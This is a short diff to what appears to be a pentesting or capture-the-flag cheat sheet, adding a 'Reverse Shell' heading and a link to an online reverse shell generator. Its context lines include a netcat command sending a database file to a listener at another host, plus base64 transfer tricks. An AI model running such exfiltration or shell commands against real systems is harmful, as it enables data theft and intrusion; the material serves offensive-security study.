@@ -22,3 +22,5 @@ nc 10.10.15.236 4444 < reactor.db
 base64 reactor.db
 echo 'asdasda' | base64 -d > reactor.db
 ```
+# 10. Reverse Shell
+[Online - Reverse Shell Generator](https://www.revshells.com)
